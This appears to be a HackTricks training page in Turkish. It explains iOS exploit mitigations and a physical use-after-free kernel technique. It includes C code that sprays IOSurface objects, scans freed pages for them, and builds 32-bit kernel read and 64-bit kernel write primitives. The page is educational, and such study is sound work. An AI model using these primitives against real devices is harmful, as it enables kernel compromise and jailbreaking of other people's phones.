# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## iOS Exploit Mitigations

- **Code Signing** iOS'ta çalıştırılacak her yürütülebilir kod parçasının (uygulamalar, kütüphaneler, uzantılar vb.) Apple tarafından verilen bir sertifika ile kriptografik olarak imzalanmasını gerektirir. Kod yüklendiğinde, iOS dijital imzayı Apple’ın güvenilen köküyle doğrular. İmza geçersizse, eksikse veya değiştirilmişse, işletim sistemi kodun çalışmasına izin vermez. Bu, saldırganların meşru uygulamalara kötü amaçlı kod enjekte etmesini veya imzasız ikili dosyaları çalıştırmasını engeller.
- **CoreTrust** çalışma zamanında code signing'i zorlayan iOS alt sistemidir. Apple’ın kök sertifikasını kullanarak imzaları doğrudan doğrular; önbelleğe alınmış güven depolarına dayanmaz; bu da yalnızca Apple tarafından imzalanmış (veya geçerli yetkilerle) ikililerin çalışabilmesini sağlar. CoreTrust, bir saldırgan uygulamayı kurulum sonrası değiştirmiş olsa da, sistem kitaplıklarını bozmuş olsa da veya imzasız kod yüklemeye çalışsa da yürütmeyi engeller.
- **Data Execution Prevention (DEP)** bellek bölgelerini açıkça kod içermedikçe yürütülemez olarak işaretler. Bu, saldırganların yığın veya heap gibi veri bölgelerine shellcode enjekte edip çalıştırmasını engeller ve onları ROP gibi daha karmaşık tekniklere zorlar.
- **ASLR (Address Space Layout Randomization)** kod, kütüphaneler, stack ve heap adreslerini her çalıştırmada rastgeleleştirir. Bu, saldırganların işe yarar talimatların veya gadget'ların nerede olduğunu tahmin etmelerini zorlaştırır.
- **KASLR (Kernel ASLR)** aynı rastgeleleştirme konseptini iOS kerneline uygular. Kernel’in temel adresini her açılışta karıştırarak, saldırganların kernel fonksiyonlarını veya yapıları güvenilir şekilde bulmasını zorlaştırır.
- **Kernel Patch Protection (KPP)** iOS’ta **AMCC (Apple Mobile File Integrity)** olarak da bilinir; kernel’in kod sayfalarını sürekli izleyerek değişiklik yapılmadığından emin olur. Kernel fonksiyonlarını yamalamaya veya kötü amaçlı kod eklemeye çalışan herhangi bir müdahale tespit edilirse cihaz derhal panic yapar ve yeniden başlatılır. Bu, sürekli kernel exploit'lerini zorlaştırır çünkü saldırganlar kernel talimatlarını hook'lamadan veya yama yapmadan bunu başaramaz.
- **Kernel Text Readonly Region (KTRR)** iOS cihazlarında donanımsal bir güvenlik özelliğidir. CPU’nun bellek denetleyicisini kullanarak kernel’in kod (text) bölümünü önyüklemeden sonra kalıcı olarak salt okunur yapar. Bir kez kilitlendikten sonra, kernel bile bu bellek bölgesini değiştiremez. Bu, kernel kodunun çalışma zamanında değiştirilmesini engeller.
- **Pointer Authentication Codes (PAC)** işaretçilerin kullanılmadan önce bütünlüğünü doğrulamak için işaretçilerin kullanılmayan bitlerine gömülü kriptografik imzalar kullanır. Bir işaretçi oluşturulduğunda CPU onu gizli bir anahtarla imzalar; dereference edilmeden önce CPU imzayı kontrol eder. İşaretçi değiştirilmişse kontrol başarısız olur ve yürütme durur. Bu, saldırganların bellek bozulması exploit'lerinde sahte veya değiştirilmiş işaretçiler kullanmasını zorlaştırır.
- **Privilege Access never (PAN)** kernel’in (ayrıcalıklı mod) kullanıcı alanı belleğine doğrudan erişmesini engelleyen bir donanım özelliğidir; erişimi açıkça etkinleştirmedikçe erişim yoktur. Bu, kernel kod yürütmesini ele geçiren saldırganların kullanıcı belleğini kolayca okuyup yazmasını, ayrıcalık yükseltmelerini veya hassas verileri çalmalarını zorlaştırır.
- **Page Protection Layer (PPL)** code signing ve entitlements ile ilişkili kritik kernel yönetimli bellek bölgelerini koruyan bir iOS güvenlik mekanizmasıdır. MMU ve ek kontroller kullanarak sıkı yazma koruması uygular, böylece ayrıcalıklı kernel kodu bile hassas sayfaları keyfi olarak değiştiremez. Bu, kernel seviyesi yürütme kazanan saldırganların güvenlik kritik yapıların üzerinde değişiklik yapmasını zorlaştırır.

## Physical use-after-free

Bu özet [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) adresindeki gönderiden alınmıştır; ayrıca bu tekniği kullanan exploit hakkında daha fazla bilgi için {#ref}https://github.com/felix-pb/kfd{#endref} bakılabilir.

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

Kullanıcı süreçleri için **virtual memory address space**, iOS'ta **0x0 ile 0x8000000000** arasında yer alır. Ancak bu adresler fiziksel belleğe doğrudan eşlenmez. Bunun yerine **kernel**, sanal adresleri gerçek **physical addresses**'e çevirmek için **page tables** kullanır.

#### Levels of Page Tables in iOS

Page table'lar üç seviyeli hiyerarşik olarak düzenlenmiştir:

1. **L1 Page Table (Level 1)**:
* Her giriş burada geniş bir sanal bellek aralığını temsil eder.
* **0x1000000000 bytes** (veya **256 GB**) sanal belleği kapsar.
2. **L2 Page Table (Level 2)**:
* Buradaki bir giriş daha küçük bir sanal bellek bölgesini, özellikle **0x2000000 bytes** (32 MB) temsil eder.
* Bir L1 girişi tüm bölgeyi kendisi eşleyemiyorsa bir L2 tablosuna işaret edebilir.
3. **L3 Page Table (Level 3)**:
* En ince seviyedir; her giriş tek bir **4 KB** bellek sayfasını eşler.
* Daha ayrıntılı kontrol gerekirse L2 girdisi bir L3 tablosuna işaret edebilir.

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* Bazı page table girişleri sanal adreslerin bir aralığını bitişik bir fiziksel adres aralığına doğrudan eşler (kısayol gibi).
* **Pointer to Child Page Table**:
* Daha ince kontrol gerekiyorsa, bir seviyedeki giriş (ör. L1) bir sonraki seviyedeki **child page table**'a işaret edebilir (ör. L2).

#### Example: Mapping a Virtual Address

Örneğin sanal adres **0x1000000000**'a erişmeye çalıştığınızı varsayalım:

1. **L1 Table**:
* Kernel bu sanal adrese karşılık gelen L1 page table girişini kontrol eder. Eğer giriş bir **pointer to an L2 page table** gösteriyorsa, o L2 tablosuna gider.
2. **L2 Table**:
* Kernel daha ayrıntılı bir eşleme için L2 page table'ı kontrol eder. Eğer bu giriş bir **L3 page table**'a işaret ediyorsa, oraya gider.
3. **L3 Table**:
* Kernel son L3 girişine bakar; bu giriş gerçek bellek sayfasının **physical address**'ine işaret eder.

#### Example of Address Mapping

Eğer fiziksel adres **0x800004000**'ı L2 tablosunun ilk indeksine yazarsanız, o zaman:

* **0x1000000000** ile **0x1002000000** arasındaki sanal adresler **0x800004000** ile **0x802004000** arasındaki fiziksel adreslere eşlenir.
* Bu, L2 seviyesinde bir **block mapping**'dir.

Alternatif olarak L2 girişi bir L3 tablosuna işaret ederse:

* **0x1000000000 -> 0x1002000000** aralığındaki her 4 KB sayfa, L3 tablosundaki bireysel girişlerle eşlenecektir.

### Physical use-after-free

Bir **physical use-after-free (UAF)** şu durumda meydana gelir:

1. Bir süreç bazı belleği **readable and writable** olarak **allocate** eder.
2. Bu belleği sürecin erişebileceği belirli bir fiziksel adrese eşlemek için **page tables** güncellenir.
3. Süreç belleği **deallocate** (free) eder.
4. Ancak bir **bug** nedeniyle kernel, ilgili fiziksel belleği serbest olarak işaretlemesine rağmen page table’daki eşlemeyi **kaldırmayı unutur**.
5. Kernel daha sonra bu “serbest” fiziksel belleği başka amaçlar için, örneğin **kernel data** gibi, **reallocate** edebilir.
6. Eşleme kaldırılmadığı için süreç bu fiziksel belleği hâlâ **read ve write** edebilir.

Bu, sürecin **kernel belleği sayfalarına** erişebilmesi anlamına gelir; bu sayfalar hassas veri veya yapılar içerebilir ve saldırganın **kernel belleğini manipüle etmesine** olanak verebilir.

### IOSurface Heap Spray

Saldırgan hangi kernel sayfalarının serbest belleğe atanacağını kontrol edemediği için, bir teknik olan **heap spray** kullanılır:

1. Saldırgan kernel belleğinde çok sayıda **IOSurface** object yaratır.
2. Her IOSurface objesi, tanımlanması kolay olması için bir alanında **magic value** içerir.
3. Serbest bırakılmış sayfaları **scan** ederek bu IOSurface objelerinden herhangi birinin serbest sayfaya düşüp düşmediğini kontrol ederler.
4. Bir IOSurface objesinin serbest sayfada olduğunu bulduklarında, bunu **kernel memory**'yi **read ve write** etmek için kullanabilirler.

Detaylı bilgi için {#ref}https://github.com/felix-pb/kfd/tree/main/writeups{#endref} bakılabilir.

> [!TIP]
> iOS 16+ (A12+) cihazların PPL veya SPTM gibi donanımsal mitigasyonlar getirdiğini ve bunun physical UAF tekniklerini çok daha az uygulanabilir hale getirdiğini unutmayın.
> PPL, code signing, entitlements ve hassas kernel verileriyle ilişkili sayfalara MMU bazlı sıkı korumalar uygular; dolayısıyla bir sayfa tekrar kullanılsa bile, userland veya ele geçirilmiş kernel kodundan PPL korumalı sayfalara yazmalar engellenir.
> Secure Page Table Monitor (SPTM) PPL'yi genişleterek page table güncellemelerini sertleştirir. Bu, ayrıcalıklı kernel kodunun bile freed sayfaları sessizce yeniden eşlememesini veya mapping'lerle oynamamasını sağlar.
> KTRR kernel’in kod bölümünü önyüklemeden sonra salt okunur hale kilitleyerek runtime sırasında kernel kodunda herhangi bir değişikliği engeller. Bu, physical UAF exploit'lerinin sıklıkla dayandığı büyük bir saldırı vektörünü kapatır.
> Ayrıca, `IOSurface` alloc'ları artık daha öngörülemez ve kullanıcı erişimli bölgelere eşlemek zor olduğu için “magic value scanning” hilesi çok daha güvenilir değildir. Ve `IOSurface` artık entitlements ve sandbox kısıtlamalarıyla korunmaktadır.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: Saldırgan özel bir tanımlayıcı ("magic value") içeren çok sayıda IOSurface objesi oluşturur.
2. **Scan Freed Pages**: Bu objelerden herhangi birinin serbest bir sayfaya atanıp atanmadığını kontrol eder.
3. **Read/Write Kernel Memory**: IOSurface objesindeki alanları manipüle ederek, kernel belleğinde **arbitrary reads and writes** yapma yeteneği elde ederler. Bu onlara şunları sağlar:
* Bir alanı kullanarak kernel belleğindeki herhangi bir 32-bit değeri **read** edebilme.
* Başka bir alanı kullanarak 64-bit değerleri **write** edebilme; böylece kararlı bir **kernel read/write primitive** elde edilir.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Bir serbest bırakılmış fiziksel sayfada **`IOSurface`** nesnelerini ara:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### IOSurface ile Kernel Read/Write Elde Etme

kernel belleğindeki bir IOSurface nesnesi üzerinde kontrol sağladıktan sonra (userspace'ten erişilebilen boşaltılmış bir fiziksel sayfaya maplenmiş), bunu **arbitrary kernel read and write operations** için kullanabiliriz.

**Key Fields in IOSurface**

IOSurface nesnesinin iki kritik alanı vardır:

1. **Use Count Pointer**: Bir **32-bit read** sağlar.
2. **Indexed Timestamp Pointer**: Bir **64-bit write** sağlar.

Bu pointer'ları overwrite ederek, onları kernel belleğindeki arbitrary adreslere yönlendirip read/write yetenekleri elde edebiliriz.

#### 32-Bit Kernel Read

Okuma yapmak için:

1. **Use Count Pointer**'ı hedef adresin 0x14-byte offset eksiğine işaret edecek şekilde üzerine yazın.
2. `get_use_count` metodunu kullanarak o adresteki değeri okuyun.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Bir yazma işlemi gerçekleştirmek için:

1. Overwrite ederek **indexed timestamp pointer**'ı hedef adrese ayarlayın.
2. 64-bit bir değer yazmak için `set_indexed_timestamp` metodunu kullanın.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Akış Özeti

1. **Trigger Physical Use-After-Free**: Serbest bırakılmış sayfalar yeniden kullanım için kullanılabilir.
2. **Spray IOSurface Objects**: Çekirdek belleğe benzersiz bir "magic value" içeren birçok IOSurface nesnesi ayırın.
3. **Identify Accessible IOSurface**: Kontrolünüzdeki serbest bırakılmış bir sayfada bir IOSurface bulun.
4. **Abuse Use-After-Free**: IOSurface nesnesindeki işaretçileri değiştirerek IOSurface yöntemleri aracılığıyla rastgele **kernel read/write** sağlayın.

Bu primitiflerle exploit, çekirdek belleğe kontrollü **32-bit reads** ve **64-bit writes** sağlar. Daha ileri jailbreak adımları daha kararlı read/write primitifleri gerektirebilir; bu da ek korumaların (örn. daha yeni arm64e cihazlarda PPL) atlatılmasını gerektirebilir.

{{#include ../../banners/hacktricks-training.md}}
